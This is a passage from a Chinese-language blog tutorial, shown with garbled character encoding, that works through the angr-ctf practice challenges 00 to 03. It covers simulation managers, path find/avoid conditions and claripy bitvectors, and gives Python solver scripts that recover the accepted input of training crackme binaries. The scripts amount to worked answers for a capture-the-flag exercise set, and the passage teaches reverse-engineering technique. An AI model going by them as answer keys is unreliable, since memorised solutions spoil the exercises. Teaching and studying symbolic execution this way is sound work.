<li><code>state.posix</code>ï¼šPOSIX ç›¸å…³çš„ç¯å¢ƒæ¥å£ï¼Œä¾‹å¦‚ <code>state.posix.dumps(fileno)</code> è·å–å¯¹åº”æ–‡ä»¶æè¿°ç¬¦ä¸Šçš„æµ</li>
</ul>
<p>é™¤äº†è¿™äº›å¯¹æ¨¡æ‹Ÿæ‰§è¡ŒçŠ¶æ€çš„ä¿¡æ¯è·å–æ¥å£å¤–ï¼Œè¿˜æœ‰ä¸€äº›è§£å†³æ–¹æ³•çš„å¯¹åº”æ¥å£ <code>state.solver</code>ï¼Œæˆ‘ä»¬å°†åœ¨åç»­è¿›è¡Œè®²è§£</p>
<h5 id="III-simulation-manager-æ¨¡æ‹Ÿæ‰§è¡Œå™¨"><a href="#III-simulation-manager-æ¨¡æ‹Ÿæ‰§è¡Œå™¨" class="headerlink" title="III. simulation_manager - æ¨¡æ‹Ÿæ‰§è¡Œå™¨"></a>III. simulation_manager - æ¨¡æ‹Ÿæ‰§è¡Œå™¨</h5><p>angr å°†ä¸€ä¸ªçŠ¶æ€çš„æ‰§è¡Œæ–¹æ³•ç‹¬ç«‹æˆä¸€ä¸ª <code>SimulationManager</code> ç±»ï¼Œä»¥ä¸‹ä¸¤ç§å†™æ³•ç­‰æ•ˆï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.factory.simgr(state)<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.factory.simulation_manager(state)<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<br></code></pre></td></tr></table></figure>

<ul>
<li><code>simgr.step()</code>ï¼š<strong>ä»¥åŸºæœ¬å—ä¸ºå•ä½</strong>çš„å•æ­¥æ‰§è¡Œ</li>
<li><code>simgr.explore(addr)</code>ï¼šè·¯å¾„æ¢ç´¢ï¼Œå³<strong>æ‰§è¡Œåˆ°æŒ‡å®šåœ°å€</strong>å¹¶è¿›è¡Œçº¦æŸæ±‚è§£ï¼Œå°†æ‰§è¡Œå®Œæˆçš„çŠ¶æ€æ”¾åœ¨ <code>simgr.found</code> åˆ—è¡¨ä¸­ï¼Œè‹¥æ— æ³•æ±‚è§£åˆ™è¯¥åˆ—è¡¨ä¸ºç©º</li>
</ul>
<h3 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨å·²ç»äº†è§£äº† angr çš„åŸºæœ¬ä½¿ç”¨æ–¹æ³•äº†ï¼Œè€Œæœ¬é¢˜æˆ‘ä»¬åªéœ€è¦æ¢ç´¢åˆ°å¯¹åº”è·¯å¾„å³å¯ï¼Œäºæ˜¯æœ€åçš„æ±‚è§£è„šæœ¬å¦‚ä¸‹ï¼Œè¯¦è§æ³¨é‡Šï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./00_angr_find&#x27;</span><br>    proj = angr.Project(bin_path) <span class="hljs-comment"># load the binary file</span><br>    init_state = proj.factory.entry_state() <span class="hljs-comment"># create an empty context</span><br>    simgr = proj.factory.simgr(init_state) <span class="hljs-comment"># create a simulator_manager</span><br>    obj_path_addr = <span class="hljs-number">0x80492F0</span> <span class="hljs-comment"># the path we&#x27;d like to explore</span><br>    simgr.explore(find = obj_path_addr) <span class="hljs-comment"># start to explore</span><br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># print the input that solve the constraint</span><br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>ä¸€ä¸‹å°±è·‘å‡ºæ¥äº†ï¼Œå¾ˆå¿«å•Š.mp4</p>
<p><img src="https://s2.loli.net/2022/10/31/BXmxhVOWjQdDwoE.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="01-angr-avoidï¼šè·¯å¾„é¿å…"><a href="#01-angr-avoidï¼šè·¯å¾„é¿å…" class="headerlink" title="01_angr_avoidï¼šè·¯å¾„é¿å…"></a>01_angr_avoidï¼šè·¯å¾„é¿å…</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œå‘ç°å¤ªå¤§äº†ï¼ˆæµæ±—é»„è±†.jpgï¼‰</p>
<p><img src="https://s2.loli.net/2022/10/31/sKdFIweu56Sya9H.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é‚£è¿™é‡Œæˆ‘ä»¬æ‰‹åŠ¨åˆ†æä¸€ä¸‹ï¼Œmain çš„é€»è¾‘è¿˜æ˜¯æƒ¯ä¾‹è¯»å…¥ 8 å­—ç¬¦ä½œä¸º s1ï¼Œè€Œ s2 æ˜¯ä¸€ä¸ªå›ºå®šå€¼çš„å­—ç¬¦ä¸²ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/xJFCTN5OZVsjnkG.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ä¹‹åå¤§æ¦‚å°±æ˜¯ä¼šå¯¹ s1ã€s2 è¿›è¡Œä¸€å®šå¤„ç†å¹¶åœ¨å„ç§ä»£ç å—é—´è·³è½¬ï¼Œæœ‰çš„è·¯å¾„ä¸Šä¼šè°ƒç”¨åˆ° <code>avoid_me()</code> ï¼Œæœ€åéƒ½ä¼šè°ƒç”¨åˆ° <code>maybe_good()</code> ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/fRWJnZhMtyD5qo6.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é‚£ä¹ˆ <code>maybe_good()</code> å‡½æ•°çœ‹æ ·å­åº”è¯¥æ˜¯æˆ‘ä»¬æœ€ç»ˆè¦æ±‚è§£çš„è·¯å¾„ç»ˆç‚¹ï¼Œåªè¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š1ï¼‰<code>should_succeed != 0</code> 2ï¼‰<code>s1 == s2</code> ä¾¿è¯´æ˜æˆ‘ä»¬æˆåŠŸäº†ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/6d8uNkXWAoR1PM7.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è€Œ <code>avoid_me()</code>ä¼šå°†å˜é‡ <code>should_succeed</code> ç½® 0ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬åœ¨æ‰§è¡Œæ—¶åº”è¯¥é¿å…è°ƒç”¨äº†è¯¥å‡½æ•°çš„è·¯å¾„ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/dQs5x4cuhTl2AzD.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å¦‚æœç¡¬é€†çš„è¯é€»è¾‘è¿˜æ˜¯æ¯”è¾ƒå¤æ‚çš„ï¼ˆ<del>åæ­£ğŸ‘´è‚¯å®šä¸æ„¿æ„æ‰‹åŠ¨é€†</del>ï¼‰ï¼Œäºæ˜¯æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥ä½¿ç”¨ angr è¿›è¡Œæ±‚è§£ï¼Œç›®æ ‡è·¯å¾„è¿˜æ˜¯è¾“å‡º <code>&quot;Good Job.&quot;</code>ï¼Œä¸è¿‡è¿™ä¸€é¢˜æˆ‘ä»¬å¤šäº†ä¸€ä¸ªçº¦æŸï¼šé¿å¼€ <code>avoid_me()</code> å‡½æ•°çš„æ‰§è¡Œ</p>
<p>å¦‚æœæˆ‘ä»¬ä¸é¿å¼€è¿™ä¸ªè¿‘ä¹æ— å¤„ä¸åœ¨çš„ <code>avoid_me()</code> å‡½æ•°ï¼Œåˆ™ä¼šé€ æˆ<strong>è·¯å¾„çˆ†ç‚¸</strong>ï¼ˆPath Explosionï¼‰ï¼Œä»è€Œå¤§å¹…åº¦å¢åŠ æ±‚è§£æ—¶é—´ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨è·¯å¾„çº¦æŸçš„æ±‚è§£ä¸Šé¿å¼€è¯¥å‡½æ•°</p>
<h3 id="simgr-explore-çš„åŸºæœ¬ç”¨æ³•"><a href="#simgr-explore-çš„åŸºæœ¬ç”¨æ³•" class="headerlink" title="simgr.explore() çš„åŸºæœ¬ç”¨æ³•"></a>simgr.explore() çš„åŸºæœ¬ç”¨æ³•</h3><p>æˆ‘ä»¬é€šå¸¸ä½¿ç”¨æ¨¡æ‹Ÿå™¨çš„ <code>.explore()</code> æ–¹æ³•æ¥è¿›è¡Œè·¯å¾„æ¢ç´¢ï¼Œä¼ å…¥çš„é»˜è®¤å‚æ•°ä¸º <code>find</code>â€”â€”ä¸€ä¸ª&#x2F;ä¸€ç»„ä»¤æ¨¡æ‹Ÿå™¨ç»ˆæ­¢è¿è¡Œçš„åœ°å€ï¼Œç¬¦åˆçš„æ‰§è¡ŒçŠ¶æ€ç»“æœä¼šè¢«æ”¾åˆ° <code>.found</code> åˆ—è¡¨ä¸­</p>
<p>ä½†é™¤äº† <code>find</code> å‚æ•°å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŒ‡å®š <code>avoid</code> å‚æ•°â€”â€”æ¨¡æ‹Ÿå™¨è¿è¡Œä¸­åº”å½“è¦<strong>é¿å¼€</strong>çš„åœ°å€ï¼Œå½“ä¸€ä¸ªçŠ¶æ€æ‰§è¡Œåˆ°è¿™æ ·çš„åœ°å€æ—¶ï¼Œå…¶ä¼šè¢«æ”¾åœ¨ <code>.avoided</code> åˆ—è¡¨ä¸­å¹¶ä¸å†å¾€åæ‰§è¡Œ</p>
<p>æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡æŒ‡å®š <code>num_find</code> å‚æ•°æ¥æŒ‡å®šéœ€è¦å¯»æ‰¾çš„è§£çŠ¶æ€çš„æ•°é‡ï¼Œè‹¥æœªæŒ‡å®šåˆ™ä¼šåœ¨ <code>.found</code> åˆ—è¡¨ä¸­å­˜å‚¨æ‰€æœ‰çš„è§£çŠ¶æ€</p>
<h3 id="FINAL-EXPLOUT"><a href="#FINAL-EXPLOUT" class="headerlink" title="FINAL EXPLOUT"></a>FINAL EXPLOUT</h3><p>ç°åœ¨æˆ‘ä»¬çŸ¥é“è¯¥å¦‚ä½•è¿›è¡Œè·¯å¾„é¿å…äº†ï¼Œäºæ˜¯æœ€åçš„æ±‚è§£è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./01_angr_avoid&#x27;</span><br>    proj = angr.Project(bin_path) <span class="hljs-comment"># load the binary file</span><br>    init_state = proj.factory.entry_state() <span class="hljs-comment"># create an empty context</span><br>    simgr = proj.factory.simgr(init_state) <span class="hljs-comment"># create a simulator_manager</span><br>    obj_path_addr = <span class="hljs-number">0x80492F8</span> <span class="hljs-comment"># the path we&#x27;d like to explore</span><br>    avoid_path_addr = <span class="hljs-number">0x80492BB</span> <span class="hljs-comment"># the path that we need to avoid</span><br>    simgr.explore(find = obj_path_addr, avoid = avoid_path_addr) <span class="hljs-comment"># start to explore</span><br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># print the input that solve the constraint</span><br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>è¿˜æ˜¯ä¸€ä¸‹å­å°±å‡ºæ¥äº†ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/wfTengqWBDoRisK.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>ç¬”è€…å®é™…è·‘äº†ä¸€ä¸‹ä¸é¿å¼€è¯¥çº¦æŸçš„æ±‚è§£åœºæ™¯ï¼Œå·¨<del>â„¢</del>æ…¢ï¼Œ<del>ç›´æ¥æŠŠğŸ‘´ã®é˜¿é‡Œâ˜å­¦ç”ŸğŸ“ç»™ç‚¸äº†</del></p>
</blockquote>
<h2 id="02-angr-find-conditionï¼šè‡ªå®šä¹‰æœç´¢æ¡ä»¶"><a href="#02-angr-find-conditionï¼šè‡ªå®šä¹‰æœç´¢æ¡ä»¶" class="headerlink" title="02_angr_find_conditionï¼šè‡ªå®šä¹‰æœç´¢æ¡ä»¶"></a>02_angr_find_conditionï¼šè‡ªå®šä¹‰æœç´¢æ¡ä»¶</h2><p>æƒ¯ä¾‹åœ°æ‹–å…¥ IDAï¼Œ<strong>ä¼¼ä¹</strong>é€»è¾‘å’Œç¬¬ä¸€é“é¢˜å·®ä¸å¤šï¼Œ<code>complex_function()</code> ä¹Ÿæ²¡å•¥æ”¹å˜è¿™é‡Œå°±ä¸è´´äº†ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/uFaZBR6c31KHbx5.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ä½†ä¸€çœ‹æ±‡ç¼–å°±æµæ±—é»„è±†äº†ï¼Œ<strong>å› ä¸ºå®é™…ä¸Šå­˜åœ¨éå¸¸å¤šçš„ä¼ªè·¯å¾„</strong>ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/McqmdiDI2jXLE1f.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://s2.loli.net/2022/10/31/vhqK89csVgQ3dZz.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><strong>å¹¶ä¸”æœ‰ç€éå¸¸å¤šçš„è¾“å‡º Good Job å­—ç¬¦ä¸²çš„åŸºæœ¬å—</strong>ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/fq8Gy3AHdLEXJ51.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å¦‚æœä½ åªæ˜¯ç®€å•çœ‹äº†ä¸€ä¸‹ç„¶åéšä¾¿é€‰äº†ä¸€ä¸ªï¼ˆæ¯”å¦‚è¯´çœ‹åˆ°ç¬¬ä¸€ä¸ªç›´æ¥é€‰ï¼‰æ‰”è¿› angr é‡Œæ±‚è§£ï¼Œ<strong>é‚£å°±å¯„äº†</strong>ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/ZxejJwIW8TRGlD9.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ€ä¹ˆåŠå‘¢ï¼Ÿç¬¬ä¸€ç§æ–¹æ³•æ˜¯æ‰‹åŠ¨å†åˆ†æä¸€ä¸‹è¿™äº›ä¼ªè·¯å¾„ï¼Œä½†æ˜¯è¿™å°±ä¸ç¬¦åˆæˆ‘ä»¬ä½¿ç”¨ angr çš„è‡ªåŠ¨æ±‚è§£æ€æƒ³äº†ï¼šï¼‰å› æ­¤æˆ‘ä»¬éœ€è¦å¯»æ‰¾ä¸€ç§èƒ½å¤Ÿé¿å¼€è¿™äº›è·¯å¾„çš„æ–¹æ³•</p>
<h3 id="simgr-explore-çš„æ‰©å±•ç”¨æ³•"><a href="#simgr-explore-çš„æ‰©å±•ç”¨æ³•" class="headerlink" title="simgr.explore() çš„æ‰©å±•ç”¨æ³•"></a>simgr.explore() çš„æ‰©å±•ç”¨æ³•</h3><p>å®é™…ä¸Š <code>explore()</code> çš„å‚æ•° <code>find</code> ä¸ <code>avoid</code> é™¤äº†å¯ä»¥æ˜¯ç›®æ ‡åœ°å€å¤–ï¼Œ<strong>è¿˜å¯ä»¥æ˜¯è‡ªå®šä¹‰å‡½æ•°ï¼Œå‚æ•°ä¸ºæ¨¡æ‹ŸçŠ¶æ€ï¼Œè¿”å›å€¼ä¸ºåˆ¤å®šæ¡ä»¶çš„å¸ƒå°”å€¼</strong></p>
<ul>
<li>å³æˆ‘ä»¬å¯ä»¥ç¼–å†™è‡ªå®šä¹‰å‡½æ•°æ¥åˆ¤æ–­ä¸€ä¸ªçŠ¶æ€æ˜¯å¦æ˜¯æˆ‘ä»¬åº”å½“è¦å¯»æ‰¾çš„çŠ¶æ€</li>
</ul>
<p>ä¾‹å¦‚ï¼Œè‹¥æ˜¯æˆ‘ä»¬æƒ³è¦å¯»æ‰¾ä¸€æ¡è¾“å‡ºæŒ‡å®šå­—ç¬¦ä¸²çš„è·¯å¾„ï¼Œå¯ä»¥é€‰æ‹©é€šè¿‡åˆ¤æ–­è¯¥å­—ç¬¦ä¸²æ˜¯å¦åœ¨è¾“å‡ºä¸­çš„æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>state.posix.dumps(æ–‡ä»¶æè¿°ç¬¦)</code> æ¥è·å–å¯¹åº”æ–‡ä»¶æè¿°ç¬¦ä¸Šçš„å­—ç¬¦æµï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;arttnba3&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(<span class="hljs-number">1</span>) <span class="hljs-comment"># 1 for stdout</span><br><span class="hljs-comment"># ...</span><br>simgr.explore(find = foo)<br></code></pre></td></tr></table></figure>

<h3 id="FINAL-EXPLOUT-1"><a href="#FINAL-EXPLOUT-1" class="headerlink" title="FINAL EXPLOUT"></a>FINAL EXPLOUT</h3><p>é‚£ä¹ˆè§£é¢˜æ€è·¯å°±æ¸…æ™°äº†ï¼Œæˆ‘ä»¬å°†æ±‚è§£çš„ç›®æ ‡è·¯å¾„è®¾ä¸ºè¾“å‡º <code>&quot;Good Job.&quot;</code> å­—ç¬¦ä¸²ã€avoid è·¯å¾„è®¾ä¸ºè¾“å‡º <code>&quot;Try again.&quot;</code> å­—ç¬¦ä¸²å³å¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>():<br>    bin_path = <span class="hljs-string">&#x27;./02_angr_find_condition&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br><br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solve()<br></code></pre></td></tr></table></figure>

<p>è¿˜æ˜¯ç§’è§£ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/9nVmrKZvkezSdRQ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0x02-angr-ctfï¼šç¬¦å·åŒ–"><a href="#0x02-angr-ctfï¼šç¬¦å·åŒ–" class="headerlink" title="0x02. angr-ctfï¼šç¬¦å·åŒ–"></a>0x02. angr-ctfï¼šç¬¦å·åŒ–</h1><h2 id="03-angr-symbolic-registersï¼šç¬¦å·åŒ–å¯„å­˜å™¨"><a href="#03-angr-symbolic-registersï¼šç¬¦å·åŒ–å¯„å­˜å™¨" class="headerlink" title="03_angr_symbolic_registersï¼šç¬¦å·åŒ–å¯„å­˜å™¨"></a>03_angr_symbolic_registersï¼šç¬¦å·åŒ–å¯„å­˜å™¨</h2><p>æƒ¯ä¾‹æ‹–è¿› IDAï¼Œå¤§æ¦‚æ˜¯è¯»å…¥è¾“å…¥åç”¨ä¸‰ä¸ªå‡½æ•°ç®€å•ç®—ä¸€ä¸‹ï¼Œè¾“å…¥å‚æ•°æ˜¯ <code>eaxã€ebxã€edx</code> å¯„å­˜å™¨çš„å€¼ï¼Œä¸‰ä¸ªç»“æœéƒ½ä¸º 0 å°±ğŸ†—äº†ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/Yze2DrmB6a1owTQ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åœ¨ <code>get_user_input()</code> é‡Œä¼šåˆ†åˆ«è¯»ä¸‰ä¸ªæ•°åˆ° <code>eaxã€ebxã€edx</code> å¯„å­˜å™¨ä¸­ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/2n6murUotEjVgCi.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>ç„¶åä½ ä¼šå‘ç°åç¼–è¯‘çš„ç»“æœå°±æ˜¯ä¸ªğŸ“â‘§â€¦ğŸ‘´åˆšçœ‹åç¼–è¯‘çš„ä¼ªä»£ç è¿˜æƒ³äº†åŠå¤©ä¸ºå•¥è¦å¤šè¯»ä¸¤ä¸ªæ•°ç„¶åæ‰”æ‰</p>
<p><img src="https://s2.loli.net/2022/10/31/DoxlVIvprB4KATb.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://s2.loli.net/2022/10/31/8poqhHj2W1gi6lk.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
</blockquote>
<p>ç„¶åä½ ä¼šå‘ç°ç”¨ä¸Šä¸€é¢˜çš„è„šæœ¬ä¹Ÿèƒ½ç§’è§£â€¦ä¸è¿‡è¿™æ ·å°±ä¸æ˜¯è¿™é“é¢˜å‡ºé¢˜çš„ç›®çš„äº†ï¼šï¼‰</p>
<p>é‡æ–°è¯»ä¸€ä¸‹é¢˜ç›®â€”â€”<code>symbolic registers</code>ï¼Œè¿™æ„å‘³ç€<strong>æœ¬é¢˜æˆ‘ä»¬åº”å½“å°†è¿™ä¸‰ä¸ªå¯„å­˜å™¨è®¾ç½®ä¸ºç¬¦å·å˜é‡æ¥è¿›è¡Œçº¦æŸæ±‚è§£</strong></p>
<h3 id="Claripy-angr-çš„æ±‚è§£å¼•æ“"><a href="#Claripy-angr-çš„æ±‚è§£å¼•æ“" class="headerlink" title="Claripy - angr çš„æ±‚è§£å¼•æ“"></a>Claripy - angr çš„æ±‚è§£å¼•æ“</h3><p><code>Claripy</code> æ˜¯ angr çš„<strong>æ±‚è§£å¼•æ“</strong>ï¼ˆsolver engineï¼‰ï¼Œå…¶å†…éƒ¨ä¼šæ— ç¼æ··åˆä½¿ç”¨å‡ ç§åç«¯ï¼ˆconcrete bitvectorsã€SAT solvers ç­‰ï¼‰ï¼Œå¯¹äºæˆ‘ä»¬è€Œè¨€ä¸€èˆ¬ä¸éœ€è¦ç›´æ¥ä¸å…¶è¿›è¡Œäº¤äº’ï¼Œä½†é€šå¸¸æˆ‘ä»¬ä¼šä½¿ç”¨å…¶æä¾›çš„ä¸€äº›æ¥å£</p>
<h4 id="bitvector-ä½å‘é‡"><a href="#bitvector-ä½å‘é‡" class="headerlink" title="bitvector - ä½å‘é‡"></a>bitvector - ä½å‘é‡</h4><p><strong>ä½å‘é‡</strong>ï¼ˆbitvectorï¼‰æ˜¯ angr æ±‚è§£å¼•æ“ä¸­çš„ä¸€ä¸ªé‡è¦éƒ¨åˆ†ï¼Œå…¶è¡¨ç¤ºäº† <strong>ä¸€ç»„ä½</strong> ï¼ˆa sequence of bitsï¼‰</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>claripy.BVV(int_value, size_in_bits)</code> æˆ– <code>claripy.BVV(string_value)</code> åˆ›å»ºå¸¦æœ‰å…·ä½“å€¼ï¼ˆconcrete valueï¼‰çš„æŒ‡å®šé•¿åº¦çš„ä½å‘é‡å€¼ï¼ˆbitvector valueï¼‰ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv = claripy.BVV(<span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv<br>&lt;BV64 <span class="hljs-number">0x617274746e626133</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2<br>&lt;BV32 <span class="hljs-number">0xdeadbeef</span>&gt;<br></code></pre></td></tr></table></figure>

<p>ç›¸åŒé•¿åº¦çš„ä½å‘é‡å¯ä»¥è¿›è¡Œè¿ç®—ï¼Œå¯¹äºä¸åŒé•¿åº¦çš„ä½å‘é‡åˆ™å¯ä»¥é€šè¿‡ <code>.zero_extend(extended_bits)</code> å®Œæˆä½æ‰©å±•ï¼ˆ0å¡«å……ï¼‰åè¿›è¡Œè¿ç®—ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä½å‘é‡çš„è¿ç®—åŒæ ·å­˜åœ¨æº¢å‡ºï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = bvv2.zero_extend(<span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv + bvv2<br>&lt;BV64 <span class="hljs-number">0x617274754d102022</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv * bvv<br>&lt;BV64 <span class="hljs-number">0x9842ff8e63f3b029</span>&gt;<br></code></pre></td></tr></table></figure>

<p>ä½å‘é‡é™¤äº†ä»£è¡¨å…·ä½“å€¼ï¼ˆconcrete valueï¼‰çš„ <code>bitvector value</code> ä»¥å¤–ï¼Œè¿˜æœ‰ä»£è¡¨<strong>ç¬¦å·å˜é‡</strong>ï¼ˆsymbolic variableï¼‰çš„ <code>bitvector symbol</code>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>claripy.BVS(name, size_in_bits)</code> åˆ›å»ºå¸¦åå­—çš„æŒ‡å®šé•¿åº¦çš„ä½å‘é‡ç¬¦å·ï¼ˆbitvector symbolï¼‰ï¼š</p>
